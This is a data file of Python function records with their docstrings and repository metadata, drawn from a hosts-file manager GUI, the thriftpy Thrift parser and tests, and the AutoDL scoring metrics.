{"docstring": "\"\"\"\nRetrieve the default locale tag of current operating system.\n\n.. note:: This is a `classmethod`.\n\n:return: Default locale tag of current operating system. If the locale\n    is not found in cls.dictionary dictionary, the return value\n    \"en_US\" as default.\n:rtype: str\n\"\"\"\n", "func_signal": "def get_locale(cls):\n", "code": "lc = locale.getdefaultlocale()[0]\nif lc is None:\n    lc = \"en_US\"\nreturn lc", "path": "huhamhire-hosts/gui/language.py", "commit_date": "2014-01-22 00:00:00", "repo_name": "huhamhire/huhamhire-hosts", "stars": 1504, "license": "gpl-3.0", "language": "python", "size": 191836}
{"docstring": "\"\"\"\nRetrieve the metadata of the latest data file from a server.\n\"\"\"\n", "func_signal": "def check_update(self):\n", "code": "self.set_update_start_btns()\nself.set_label_text(self.ui.labelLatestData, unicode(\n    _translate(\"Util\", \"Checking...\", None)))\nthread = QSubChkUpdate(self)\nthread.trigger.connect(self.finish_update)\nthread.start()", "path": "huhamhire-hosts/gui/qdialog_d.py", "commit_date": "2014-07-07 00:00:00", "repo_name": "huhamhire/huhamhire-hosts", "stars": 1504, "license": "gpl-3.0", "language": "python", "size": 191836}
{"docstring": "\"\"\"\nStart operations after checking update.\n\n.. note:: This method is the slot responses to the trigger signal\n    value :attr:`update` from an instance of\n    :class:`~gui._checkupdate.QSubChkUpdate` class while checking\n    operations are finished.\n\n:param update: Metadata of the latest hosts data file on the server.\n:type update: dict\n\n.. seealso:: :attr:`trigger` in\n    :class:`~gui._checkupdate.QSubChkUpdate` class.\n\"\"\"\n", "func_signal": "def finish_update(self, update):\n", "code": "self._update = update\nself.set_label_text(self.ui.labelLatestData, update[\"version\"])\nif self._update[\"version\"] == \\\n        unicode(_translate(\"Util\", \"[Error]\", None)):\n    self.set_conn_status(0)\nelse:\n    self.set_conn_status(1)\nif self._down_flag:\n    self.fetch_update_after_check()\nelse:\n    self.set_update_finish_btns()", "path": "huhamhire-hosts/gui/qdialog_d.py", "commit_date": "2014-07-07 00:00:00", "repo_name": "huhamhire/huhamhire-hosts", "stars": 1504, "license": "gpl-3.0", "language": "python", "size": 191836}
{"docstring": "\"\"\"\nGet the locale string connecting with a language specified by\n:attr:`l_lang`.\n\n.. note:: This is a `classmethod`.\n\n:param l_lang: Localized name of a specified language.\n:type l_lang: unicode\n:return: Locale tag of a specified language.\n:rtype: str\n\"\"\"\n", "func_signal": "def get_locale_by_language(cls, l_lang):\n", "code": "for locl, lang in cls.language.items():\n    if l_lang == lang:\n        return locl\nreturn \"en_US\"", "path": "huhamhire-hosts/gui/language.py", "commit_date": "2014-01-22 00:00:00", "repo_name": "huhamhire/huhamhire-hosts", "stars": 1504, "license": "gpl-3.0", "language": "python", "size": 191836}
{"docstring": "\"\"\"\nStart operations after making new hosts file.\n\n.. note:: This method is the slot responses to the fina_trigger signal\n    values :attr:`time`, :attr:`count` from an instance of\n    :class:`~gui._make.QSubMakeHosts` class while making operations\n    are finished.\n\n:param time: Total time uesd while generating the new hosts file.\n:type time: str\n:param count: Total number of hosts entries inserted into the new\n    hosts file.\n:type count: int\n\n.. seealso:: :attr:`fina_trigger` in\n    :class:`~gui._make.QSubMakeHosts` class.\n\"\"\"\n", "func_signal": "def finish_make(self, time, count):\n", "code": "self.set_make_finish_btns()\nRetrieveData.connect_db()\nmsg = unicode(\n    _translate(\"Util\", \"Notice: %i hosts entries has \"\n                       \"\\n  been applied in %ssecs.\", None))\\\n    % (count, time)\nself.set_make_message(msg)\nself.set_down_progress(100, unicode(\n    _translate(\"Util\", \"Operation Completed Successfully!\", None)))", "path": "huhamhire-hosts/gui/qdialog_d.py", "commit_date": "2014-07-07 00:00:00", "repo_name": "huhamhire/huhamhire-hosts", "stars": 1504, "license": "gpl-3.0", "language": "python", "size": 191836}
{"docstring": "\"\"\"\nStart operations after downloading data file.\n\n.. note:: This method is the slot responses to the finish_trigger\n    signal :attr:`refresh`, :attr:`error` from an instance of\n    :class:`~gui._update.QSubFetchUpdate` class while downloading is\n    finished.\n\n:param refresh: An flag indicating whether the downloading progress is\n    successfully finished or not. Default by 1.\n:type refresh: int.\n:param error: An flag indicating whether the downloading\n      progress is successfully finished or not. Default by 0.\n:type error: int\n\n.. seealso:: :attr:`finish_trigger` in\n    :class:`~gui._update.QSubFetchUpdate` class.\n\"\"\"\n", "func_signal": "def finish_fetch(self, refresh=1, error=0):\n", "code": "self._down_flag = 0\nif error:\n    # Error occurred while downloading\n    self.set_down_progress(0, unicode(\n        _translate(\"Util\", \"Error\", None)))\n    try:\n        os.remove(self.filename)\n    except:\n        pass\n    self.warning_download()\n    msg_title = \"Warning\"\n    msg = unicode(\n        _translate(\"Util\", \"Incorrect Data file!\\n\"\n                           \"Please use the \\\"Download\\\" key to \\n\"\n                           \"fetch a new data file.\", None))\n    self.set_message(msg_title, msg)\n    self.set_conn_status(0)\nelse:\n    # Data file retrieved successfully\n    self.set_down_progress(100, unicode(\n        _translate(\"Util\", \"Download Complete\", None)))\n    self.refresh_info(refresh)\nself.set_fetch_finish_btns(error)", "path": "huhamhire-hosts/gui/qdialog_d.py", "commit_date": "2014-07-07 00:00:00", "repo_name": "huhamhire/huhamhire-hosts", "stars": 1504, "license": "gpl-3.0", "language": "python", "size": 191836}
{"docstring": "\"\"\"\nMove hosts file to the system path after making.\n\n.. note:: This method is the slot responses to the move_trigger signal\n    from an instance of :class:`~gui._make.QSubMakeHosts` class while\n    making operations are finished.\n\n.. seealso:: :attr:`move_trigger` in\n    :class:`~gui._make.QSubMakeHosts`.\n\"\"\"\n", "func_signal": "def move_hosts(self):\n", "code": "filepath = \"hosts\"\nmsg = unicode(\n    _translate(\"Util\", \"Copying new hosts file to\\n\"\n                       \"%s\", None)) % self.hosts_path\nself.set_make_message(msg)\ntry:\n    shutil.copy2(filepath, self.hosts_path)\nexcept IOError:\n    self.warning_permission()\n    os.remove(filepath)\n    return\nexcept OSError:\n    pass\nmsg = unicode(\n    _translate(\"Util\", \"Remove temporary file\", None))\nself.set_make_message(msg)\nos.remove(filepath)\nmsg = unicode(\n    _translate(\"Util\", \"Operation completed\", None))\nself.set_make_message(msg)\nself.info_complete()", "path": "huhamhire-hosts/gui/qdialog_d.py", "commit_date": "2014-07-07 00:00:00", "repo_name": "huhamhire/huhamhire-hosts", "stars": 1504, "license": "gpl-3.0", "language": "python", "size": 191836}
{"docstring": "\"\"\"\nCompare version of local data file to the version from the server.\n\n:return: A flag indicating whether the local data file is up-to-date\n    or not.\n:rtype: int\n\n        ======  ============================================\n        Return  File status\n        ======  ============================================\n        1       The version of data file on server is newer.\n        0       The local data file is up-to-date.\n        ======  ============================================\n\"\"\"\n", "func_signal": "def new_version(self):\n", "code": "local_ver = self._cur_ver\nserver_ver = self._update[\"version\"]\nlocal_ver = local_ver.split('.')\nserver_ver = server_ver.split('.')\nfor i, ver_num in enumerate(local_ver):\n    if server_ver[i] > ver_num:\n        return 1\nreturn 0", "path": "huhamhire-hosts/gui/qdialog_d.py", "commit_date": "2014-07-07 00:00:00", "repo_name": "huhamhire/huhamhire-hosts", "stars": 1504, "license": "gpl-3.0", "language": "python", "size": 191836}
{"docstring": "\"\"\"\nMake a new hosts file for current system.\n\n:param mode: Operation mode for making hosts file. The valid value\n    could be one of `system`, `ansi`, and `utf-8`.\n    Default by `system`.\n:type mode: str\n\"\"\"\n", "func_signal": "def make_hosts(self, mode=\"system\"):\n", "code": "self.set_make_start_btns()\nself.set_make_message(unicode(_translate(\n    \"Util\", \"Building hosts file...\", None)), 1)\n# Avoid conflict while making hosts file\nRetrieveData.disconnect_db()\nself.make_mode = mode\nself.set_config_bytes(mode)\nthread = QSubMakeHosts(self)\nthread.info_trigger.connect(self.set_make_progress)\nthread.fina_trigger.connect(self.finish_make)\nthread.move_trigger.connect(self.move_hosts)\nthread.start()", "path": "huhamhire-hosts/gui/qdialog_d.py", "commit_date": "2014-07-07 00:00:00", "repo_name": "huhamhire/huhamhire-hosts", "stars": 1504, "license": "gpl-3.0", "language": "python", "size": 191836}
{"docstring": "\"\"\"\nReturn the name of a specified language by :attr:`l_locale`.\n\n.. note:: This is a `classmethod`.\n\n:param l_locale: Locale tag of a specified language.\n:type l_locale: str\n:return: Localized name of a specified language.\n:type: str\n\"\"\"\n", "func_signal": "def get_language_by_locale(cls, l_locale):\n", "code": "try:\n    return cls.language[l_locale]\nexcept KeyError:\n    return cls.language[\"en_US\"]", "path": "huhamhire-hosts/gui/language.py", "commit_date": "2014-01-22 00:00:00", "repo_name": "huhamhire/huhamhire-hosts", "stars": 1504, "license": "gpl-3.0", "language": "python", "size": 191836}
{"docstring": "\"\"\"\nGenerate the module configuration byte words by the selection from\nfunction list on the main dialog.\n\n:param mode: Operation mode for making hosts file. The valid value\n    could be one of `system`, `ansi`, and `utf-8`.\n\n    .. seealso:: Method\n        :meth:`~gui.qdialog_d.QDialogDaemon.make_hosts`.\n\"\"\"\n", "func_signal": "def set_config_bytes(self, mode):\n", "code": "ip_flag = self._ipv_id\nselection = {}\nif mode == \"system\":\n    localhost_word = {\n        \"Windows\": 0x0001, \"Linux\": 0x0002,\n        \"Unix\": 0x0002, \"OS X\": 0x0004}[self.platform]\nelse:\n    localhost_word = 0x0008\nselection[0x02] = localhost_word\nch_parts = [0x08, 0x20 if ip_flag else 0x10, 0x40]\n# Set customized module if exists\nif (self.custom != None and os.path.isfile(self.custom)):\n    ch_parts.insert(0, 0x04)\nslices = self.slices[ip_flag]\nfor i, part in enumerate(ch_parts):\n    part_cfg = self._funcs[ip_flag][slices[i]:slices[i + 1]]\n    part_word = 0\n    for i, cfg in enumerate(part_cfg):\n        part_word += cfg << i\n    selection[part] = part_word\nself.make_cfg = selection", "path": "huhamhire-hosts/gui/qdialog_d.py", "commit_date": "2014-07-07 00:00:00", "repo_name": "huhamhire/huhamhire-hosts", "stars": 1504, "license": "gpl-3.0", "language": "python", "size": 191836}
{"docstring": "\"\"\"Parse a file-like object to thrift module object, e.g.::\n\n    >>> from thriftpy.parser.parser import parse_fp\n    >>> with open(\"path/to/note.thrift\") as fp:\n            parse_fp(fp, \"note_thrift\")\n    <module 'note_thrift' (built-in)>\n\n:param source: file-like object, expected to have a method named `read`.\n:param module_name: the name for parsed module, shoule be endswith\n                    '_thrift'.\n:param lexer: ply lexer to use, if not provided, `parse` will new one.\n:param parser: ply parser to use, if not provided, `parse` will new one.\n:param enable_cache: if this is set to be `True`, parsed module will be\n                     cached by `module_name`, this is enabled by default.\n\"\"\"\n", "func_signal": "def parse_fp(source, module_name, lexer=None, parser=None, enable_cache=True):\n", "code": "if not module_name.endswith('_thrift'):\n    raise ThriftParserError('ThriftPy can only generate module with '\n                            '\\'_thrift\\' suffix')\n\nif enable_cache and module_name in thrift_cache:\n    return thrift_cache[module_name]\n\nif not hasattr(source, 'read'):\n    raise ThriftParserError('Expected `source` to be a file-like object '\n                            'with a method named \\'read\\'')\n\nif lexer is None:\n    lexer = lex.lex()\nif parser is None:\n    parser = yacc.yacc(debug=False, write_tables=0)\n\ndata = source.read()\n\nthrift = types.ModuleType(module_name)\nsetattr(thrift, '__thrift_file__', None)\nthrift_stack.append(thrift)\nlexer.lineno = 1\nparser.parse(data)\nthrift_stack.pop()\n\nif enable_cache:\n    thrift_cache[module_name] = thrift\nreturn thrift", "path": "thriftpy/thriftpy/parser/parser.py", "commit_date": "2017-12-18 00:00:00", "repo_name": "Thriftpy/thriftpy", "stars": 1152, "license": "mit", "language": "python", "size": 806}
{"docstring": "\"\"\"Load thrift file like object as a module.\n\"\"\"\n", "func_signal": "def load_fp(source, module_name):\n", "code": "thrift = parse_fp(source, module_name)\nsys.modules[module_name] = thrift\nreturn thrift", "path": "thriftpy/thriftpy/parser/__init__.py", "commit_date": "2017-10-16 00:00:00", "repo_name": "Thriftpy/thriftpy", "stars": 1152, "license": "mit", "language": "python", "size": 806}
{"docstring": "\"\"\"\nbool add(1: Person person);\n\"\"\"\n", "func_signal": "def add(self, person):\n", "code": "if person.name in self.registry:\n    return False\nself.registry[person.name] = person\nreturn True", "path": "thriftpy/tests/test_buffered_transport.py", "commit_date": "2015-12-22 00:00:00", "repo_name": "Thriftpy/thriftpy", "stars": 1152, "license": "mit", "language": "python", "size": 806}
{"docstring": "\"\"\"\nbool add(1: Person person);\n\"\"\"\n", "func_signal": "def add(self, person):\n", "code": "if person.name in self.registry:\n    return False\nself.registry[person.name] = person\nreturn True", "path": "thriftpy/tests/test_framed_transport.py", "commit_date": "2015-03-05 00:00:00", "repo_name": "Thriftpy/thriftpy", "stars": 1152, "license": "mit", "language": "python", "size": 806}
{"docstring": "'''seen_union : UNION IDENTIFIER '''\n", "func_signal": "def p_seen_union(p):\n", "code": "val = _make_empty_struct(p[2])\nsetattr(thrift_stack[-1], p[2], val)\np[0] = val", "path": "thriftpy/thriftpy/parser/parser.py", "commit_date": "2017-12-18 00:00:00", "repo_name": "Thriftpy/thriftpy", "stars": 1152, "license": "mit", "language": "python", "size": 806}
{"docstring": "\"\"\"\nPerson get(1: string name)\n\"\"\"\n", "func_signal": "def get(self, name):\n", "code": "if name not in self.registry:\n    raise addressbook.PersonNotExistsError()\nreturn self.registry[name]", "path": "thriftpy/tests/test_buffered_transport.py", "commit_date": "2015-12-22 00:00:00", "repo_name": "Thriftpy/thriftpy", "stars": 1152, "license": "mit", "language": "python", "size": 806}
{"docstring": "'''union : seen_union '{' field_seq '}' '''\n", "func_signal": "def p_union(p):\n", "code": "val = _fill_in_struct(p[1], p[3])\n_add_thrift_meta('unions', val)", "path": "thriftpy/thriftpy/parser/parser.py", "commit_date": "2017-12-18 00:00:00", "repo_name": "Thriftpy/thriftpy", "stars": 1152, "license": "mit", "language": "python", "size": 806}
{"docstring": "'''struct : seen_struct '{' field_seq '}' type_annotations'''\n", "func_signal": "def p_struct(p):\n", "code": "val = _fill_in_struct(p[1], p[3])\n_add_thrift_meta('structs', val)", "path": "thriftpy/thriftpy/parser/parser.py", "commit_date": "2017-12-18 00:00:00", "repo_name": "Thriftpy/thriftpy", "stars": 1152, "license": "mit", "language": "python", "size": 806}
{"docstring": "'''function_type : field_type\n                 | VOID'''\n", "func_signal": "def p_function_type(p):\n", "code": "if p[1] == 'void':\n    p[0] = TType.VOID\nelse:\n    p[0] = p[1]", "path": "thriftpy/thriftpy/parser/parser.py", "commit_date": "2017-12-18 00:00:00", "repo_name": "Thriftpy/thriftpy", "stars": 1152, "license": "mit", "language": "python", "size": 806}
{"docstring": "'''simple_function : ONEWAY function_type IDENTIFIER '(' field_seq ')'\n| ONEWAY function_type IDENTIFIER '(' field_seq ')' throws\n| function_type IDENTIFIER '(' field_seq ')' throws\n| function_type IDENTIFIER '(' field_seq ')' '''\n\n", "func_signal": "def p_simple_function(p):\n", "code": "if p[1] == 'oneway':\n    oneway = True\n    base = 1\nelse:\n    oneway = False\n    base = 0\n\nif p[len(p) - 1] == ')':\n    throws = []\nelse:\n    throws = p[len(p) - 1]\n\np[0] = [oneway, p[base + 1], p[base + 2], p[base + 4], throws]", "path": "thriftpy/thriftpy/parser/parser.py", "commit_date": "2017-12-18 00:00:00", "repo_name": "Thriftpy/thriftpy", "stars": 1152, "license": "mit", "language": "python", "size": 806}
{"docstring": "'''header_unit : include\n               | cpp_include\n               | namespace'''\n\n\n", "func_signal": "def p_header_unit(p):\n", "code": "\n'''include : INCLUDE LITERAL'''\nthrift = thrift_stack[-1]\nif thrift.__thrift_file__ is None:\n    raise ThriftParserError('Unexpected include statement while loading '\n                            'from file like object.')\nreplace_include_dirs = [os.path.dirname(thrift.__thrift_file__)] \\\n    + include_dirs_\nfor include_dir in replace_include_dirs:\n    path = os.path.join(include_dir, p[2])\n    if os.path.exists(path):\n        child = parse(path)\n        setattr(thrift, child.__name__, child)\n        _add_thrift_meta('includes', child)\n        return\nraise ThriftParserError(('Couldn\\'t include thrift %s in any '\n                         'directories provided') % p[2])", "path": "thriftpy/thriftpy/parser/parser.py", "commit_date": "2017-12-18 00:00:00", "repo_name": "Thriftpy/thriftpy", "stars": 1152, "license": "mit", "language": "python", "size": 806}
{"docstring": "'''type_annotation : IDENTIFIER '=' LITERAL\n                   | IDENTIFIER '''\n", "func_signal": "def p_type_annotation(p):\n", "code": "if len(p) == 4:\n    p[0] = p[1], p[3]\nelse:\n    p[0] = p[1], None  # Without Value", "path": "thriftpy/thriftpy/parser/parser.py", "commit_date": "2017-12-18 00:00:00", "repo_name": "Thriftpy/thriftpy", "stars": 1152, "license": "mit", "language": "python", "size": 806}
{"docstring": "'''enum_item : IDENTIFIER '=' INTCONSTANT type_annotations\n             | IDENTIFIER type_annotations\n             |'''\n", "func_signal": "def p_enum_item(p):\n", "code": "if len(p) == 5:\n    p[0] = [p[1], p[3]]\nelif len(p) == 3:\n    p[0] = [p[1], None]", "path": "thriftpy/thriftpy/parser/parser.py", "commit_date": "2017-12-18 00:00:00", "repo_name": "Thriftpy/thriftpy", "stars": 1152, "license": "mit", "language": "python", "size": 806}
{"docstring": "'''definition_unit : const\n                   | ttype\n'''\n\n\n", "func_signal": "def p_definition_unit(p):\n", "code": "\n'''const : CONST field_type IDENTIFIER '=' const_value\n         | CONST field_type IDENTIFIER '=' const_value sep'''\n\ntry:\n    val = _cast(p[2])(p[5])\nexcept AssertionError:\n    raise ThriftParserError('Type error for constant %s at line %d' %\n                            (p[3], p.lineno(3)))\nsetattr(thrift_stack[-1], p[3], val)\n_add_thrift_meta('consts', val)", "path": "thriftpy/thriftpy/parser/parser.py", "commit_date": "2017-12-18 00:00:00", "repo_name": "Thriftpy/thriftpy", "stars": 1152, "license": "mit", "language": "python", "size": 806}
{"docstring": "# don't raise if we intend to close\n", "func_signal": "def close(self):\n", "code": "self.stream.set_close_callback(None)\nself.stream.close()", "path": "thriftpy/thriftpy/tornado.py", "commit_date": "2016-08-01 00:00:00", "repo_name": "Thriftpy/thriftpy", "stars": 1152, "license": "mit", "language": "python", "size": 806}
{"docstring": "\"\"\"Context for manually setting counter of seq number.\n\n:init: init value\n\"\"\"\n", "func_signal": "def counter(cls, init=0):\n", "code": "if not hasattr(ctx, \"counter\"):\n    ctx.counter = 0\n\nold = ctx.counter\nctx.counter = init\n\ntry:\n    yield\nfinally:\n    ctx.counter = old", "path": "thriftpy/thriftpy/contrib/tracking/tracker.py", "commit_date": "2016-08-09 00:00:00", "repo_name": "Thriftpy/thriftpy", "stars": 1152, "license": "mit", "language": "python", "size": 806}
{"docstring": "'''type_annotations : '(' type_annotation_seq ')'\n                    |'''\n", "func_signal": "def p_type_annotations(p):\n", "code": "if len(p) == 4:\n    p[0] = p[2]\nelse:\n    p[0] = None", "path": "thriftpy/thriftpy/parser/parser.py", "commit_date": "2017-12-18 00:00:00", "repo_name": "Thriftpy/thriftpy", "stars": 1152, "license": "mit", "language": "python", "size": 806}
{"docstring": "'''exception : EXCEPTION IDENTIFIER '{' field_seq '}' type_annotations '''\n", "func_signal": "def p_exception(p):\n", "code": "val = _make_struct(p[2], p[4], base_cls=TException)\nsetattr(thrift_stack[-1], p[2], val)\n_add_thrift_meta('exceptions', val)", "path": "thriftpy/thriftpy/parser/parser.py", "commit_date": "2017-12-18 00:00:00", "repo_name": "Thriftpy/thriftpy", "stars": 1152, "license": "mit", "language": "python", "size": 806}
{"docstring": "\"\"\"\nPerson get(1: string name)\n\"\"\"\n", "func_signal": "def get(self, name):\n", "code": "if name not in self.registry:\n    raise addressbook.PersonNotExistsError()\nreturn self.registry[name]", "path": "thriftpy/tests/test_framed_transport.py", "commit_date": "2015-03-05 00:00:00", "repo_name": "Thriftpy/thriftpy", "stars": 1152, "license": "mit", "language": "python", "size": 806}
{"docstring": "'''simple_field : field_id field_req field_type IDENTIFIER\n         | field_id field_req field_type IDENTIFIER '=' const_value\n         '''\n\n", "func_signal": "def p_simple_field(p):\n", "code": "if len(p) == 7:\n    try:\n        val = _cast(p[3])(p[6])\n    except AssertionError:\n        raise ThriftParserError(\n            'Type error for field %s '\n            'at line %d' % (p[4], p.lineno(4)))\nelse:\n    val = None\n\np[0] = [p[1], p[2], p[3], p[4], val]", "path": "thriftpy/thriftpy/parser/parser.py", "commit_date": "2017-12-18 00:00:00", "repo_name": "Thriftpy/thriftpy", "stars": 1152, "license": "mit", "language": "python", "size": 806}
{"docstring": "''' Probabilistic Accuracy based on log_loss metric.\nWe assume the solution is in {0, 1} and prediction in [0, 1].\nOtherwise, run normalize_array.'''\n", "func_signal": "def pac_metric(solution, prediction, task='binary.classification'):\n", "code": "debug_flag = False\n[sample_num, label_num] = solution.shape\nif label_num == 1: task = 'binary.classification'\neps = 1e-15\nthe_log_loss = log_loss(solution, prediction, task)\n# Compute the base log loss (using the prior probabilities)\npos_num = 1. * sum(solution)  # float conversion!\nfrac_pos = pos_num / sample_num  # prior proba of positive class\nthe_base_log_loss = prior_log_loss(frac_pos, task)\n# Alternative computation of the same thing (slower)\n# Should always return the same thing except in the multi-label case\n# For which the analytic solution makes more sense\nif debug_flag:\n    base_prediction = np.empty(prediction.shape)\n    for k in range(sample_num): base_prediction[k, :] = frac_pos\n    base_log_loss = log_loss(solution, base_prediction, task)\n    diff = np.array(abs(the_base_log_loss - base_log_loss))\n    if len(diff.shape) > 0: diff = max(diff)\n    if (diff) > 1e-10:\n        print('Arrggh {} != {}'.format(the_base_log_loss, base_log_loss))\n# Exponentiate to turn into an accuracy-like score.\n# In the multi-label case, we need to average AFTER taking the exp\n# because it is an NL operation\npac = mvmean(np.exp(-the_log_loss))\nbase_pac = mvmean(np.exp(-the_base_log_loss))\n# Normalize: 0 for random, 1 for perfect\nscore = (pac - base_pac) / sp.maximum(eps, (1 - base_pac))\nreturn score", "path": "AutoDL/AutoDL_scoring_program/libscores.py", "commit_date": "2020-04-19 00:00:00", "repo_name": "DeepWisdom/AutoDL", "stars": 1103, "license": "apache-2.0", "language": "python", "size": 4674}
{"docstring": "''' 1 - Mean absolute error divided by mean absolute deviation '''\n", "func_signal": "def a_metric(solution, prediction, task='regression'):\n", "code": "mae = mvmean(np.abs(solution - prediction))  # mean absolute error\nmad = mvmean(np.abs(solution - mvmean(solution)))  # mean absolute deviation\nscore = 1 - mae / mad\nreturn mvmean(score)", "path": "AutoDL/AutoDL_scoring_program/libscores.py", "commit_date": "2020-04-19 00:00:00", "repo_name": "DeepWisdom/AutoDL", "stars": 1103, "license": "apache-2.0", "language": "python", "size": 4674}
{"docstring": "\"\"\"Check if the examples of a TF dataset has regular shape.\"\"\"\n", "func_signal": "def has_regular_shape(dataset):\n", "code": "with tf.Graph().as_default():\n  iterator = dataset.make_one_shot_iterator()\n  example, labels = iterator.get_next()\n  return all([x > 0 for x in example.shape])", "path": "AutoDL/AutoDL_sample_code_submission/Auto_Tabular/model.py", "commit_date": "2020-04-04 00:00:00", "repo_name": "DeepWisdom/AutoDL", "stars": 1103, "license": "apache-2.0", "language": "python", "size": 4674}
{"docstring": "''' Turn predictions into decisions {0,1} by selecting the class with largest\nscore for multiclass problems and thresholding at 0.5 for other cases.'''\n# add a very small random value as tie breaker (a bit bad because this changes the score every time)\n# so to make sure we get the same result every time, we seed it\n# eps = 1e-15\n# np.random.seed(sum(array.shape))\n# array = array + eps*np.random.rand(array.shape[0],array.shape[1])\n", "func_signal": "def binarize_predictions(array, task='binary.classification'):\n", "code": "bin_array = np.zeros(array.shape)\nif (task != 'multiclass.classification') or (array.shape[1] == 1):\n    bin_array[array >= 0.5] = 1\nelse:\n    sample_num = array.shape[0]\n    for i in range(sample_num):\n        j = np.argmax(array[i, :])\n        bin_array[i, j] = 1\nreturn bin_array", "path": "AutoDL/AutoDL_scoring_program/libscores.py", "commit_date": "2020-04-19 00:00:00", "repo_name": "DeepWisdom/AutoDL", "stars": 1103, "license": "apache-2.0", "language": "python", "size": 4674}
{"docstring": "''' Moving average to avoid rounding errors. A bit slow, but...\nComputes the mean along the given axis, except if this is a vector, in which case the mean is returned.\nDoes NOT flatten.'''\n", "func_signal": "def mvmean(R, axis=0):\n", "code": "if len(R.shape) == 0: return R\naverage = lambda x: reduce(lambda i, j: (0, (j[0] / (j[0] + 1.)) * i[1] + (1. / (j[0] + 1)) * j[1]), enumerate(x))[\n    1]\nR = np.array(R)\nif len(R.shape) == 1: return average(R)\nif axis == 1:\n    return np.array(map(average, R))\nelse:\n    return np.array(map(average, R.transpose()))", "path": "AutoDL/AutoDL_sample_code_submission/Auto_Video/skeleton/projects/others.py", "commit_date": "2020-04-04 00:00:00", "repo_name": "DeepWisdom/AutoDL", "stars": 1103, "license": "apache-2.0", "language": "python", "size": 4674}
{"docstring": "''' Use min and max of solution as scaling factors to normalize prediction,\nthen threshold it to [0, 1]. Binarize solution to {0, 1}.\nThis allows applying classification scores to all cases.\nIn principle, this should not do anything to properly formatted\nclassification inputs and outputs.'''\n# Binarize solution\n", "func_signal": "def normalize_array(solution, prediction):\n", "code": "sol = np.ravel(solution)  # convert to 1-d array\nmaxi = np.nanmax((list(map(lambda x: x != float('inf'), sol))))  # Max except NaN and Inf\nmini = np.nanmin((list(map(lambda x: x != float('-inf'), sol))))  # Mini except NaN and Inf\nif maxi == mini:\n    print('Warning, cannot normalize')\n    return [solution, prediction]\ndiff = maxi - mini\nmid = (maxi + mini) / 2.\nnew_solution = np.copy(solution)\nnew_solution[solution >= mid] = 1\nnew_solution[solution < mid] = 0\n# Normalize and threshold predictions (takes effect only if solution not in {0, 1})\nnew_prediction = (np.copy(prediction) - float(mini)) / float(diff)\nnew_prediction[new_prediction > 1] = 1  # and if predictions exceed the bounds [0, 1]\nnew_prediction[new_prediction < 0] = 0\n# Make probabilities smoother\n# new_prediction = np.power(new_prediction, (1./10))\nreturn [new_solution, new_prediction]", "path": "AutoDL/AutoDL_scoring_program/libscores.py", "commit_date": "2020-04-19 00:00:00", "repo_name": "DeepWisdom/AutoDL", "stars": 1103, "license": "apache-2.0", "language": "python", "size": 4674}
{"docstring": "''' Read array and convert to 2d np arrays '''\n", "func_signal": "def read_array(filename):\n", "code": "array = np.loadtxt(filename)\nif len(array.shape) == 1:\n    array = array.reshape(-1, 1)\nreturn array", "path": "AutoDL/AutoDL_scoring_program/libscores.py", "commit_date": "2020-04-19 00:00:00", "repo_name": "DeepWisdom/AutoDL", "stars": 1103, "license": "apache-2.0", "language": "python", "size": 4674}
{"docstring": "\"\"\"Get a list of column indices for which the column has more than one class.\nThis is necessary when computing BAC or AUC which involves true positive and\ntrue negative in the denominator. When some class is missing, these scores\ndon't make sense (or you have to add an epsilon to remedy the situation).\n\nArgs:\nsolution: array, a matrix of binary entries, of shape\n  (num_examples, num_features)\nReturns:\nvalid_columns: a list of indices for which the column has more than one\n  class.\n\"\"\"\n", "func_signal": "def get_valid_columns(solution):\n", "code": "num_examples = solution.shape[0]\ncol_sum = np.sum(solution, axis=0)\nvalid_columns = np.where(1 - np.isclose(col_sum, 0) -\n                         np.isclose(col_sum, num_examples))[0]\nreturn valid_columns", "path": "AutoDL/AutoDL_sample_code_submission/Auto_Video/skeleton/projects/others.py", "commit_date": "2020-04-04 00:00:00", "repo_name": "DeepWisdom/AutoDL", "stars": 1103, "license": "apache-2.0", "language": "python", "size": 4674}
{"docstring": "''' Get all information {attribute = value} pairs from the public.info file'''\n", "func_signal": "def get_info(filename):\n", "code": "info = {}\nwith open(filename, \"r\") as info_file:\n    lines = info_file.readlines()\n    features_list = list(map(lambda x: tuple(x.strip(\"\\'\").split(\" = \")), lines))\n    for (key, value) in features_list:\n        info[key] = value.rstrip().strip(\"'\").strip(' ')\n        if info[key].isdigit():  # if we have a number, we want it to be an integer\n            info[key] = int(info[key])\nreturn info", "path": "AutoDL/AutoDL_scoring_program/libscores.py", "commit_date": "2020-04-19 00:00:00", "repo_name": "DeepWisdom/AutoDL", "stars": 1103, "license": "apache-2.0", "language": "python", "size": 4674}
{"docstring": "''' Compute the normalized balanced accuracy. The binarization and\nthe normalization differ for the multi-label and multi-class case. '''\n", "func_signal": "def bac_metric(solution, prediction, task='binary.classification'):\n", "code": "label_num = solution.shape[1]\nscore = np.zeros(label_num)\nbin_prediction = binarize_predictions(prediction, task)\n[tn, fp, tp, fn] = acc_stat(solution, bin_prediction)\n# Bounding to avoid division by 0\neps = 1e-15\ntp = sp.maximum(eps, tp)\npos_num = sp.maximum(eps, tp + fn)\ntpr = tp / pos_num  # true positive rate (sensitivity)\nif (task != 'multiclass.classification') or (label_num == 1):\n    tn = sp.maximum(eps, tn)\n    neg_num = sp.maximum(eps, tn + fp)\n    tnr = tn / neg_num  # true negative rate (specificity)\n    bac = 0.5 * (tpr + tnr)\n    base_bac = 0.5  # random predictions for binary case\nelse:\n    bac = tpr\n    base_bac = 1. / label_num  # random predictions for multiclass case\nbac = mvmean(bac)  # average over all classes\n# Normalize: 0 for random, 1 for perfect\nscore = (bac - base_bac) / sp.maximum(eps, (1 - base_bac))\nreturn score", "path": "AutoDL/AutoDL_scoring_program/libscores.py", "commit_date": "2020-04-19 00:00:00", "repo_name": "DeepWisdom/AutoDL", "stars": 1103, "license": "apache-2.0", "language": "python", "size": 4674}
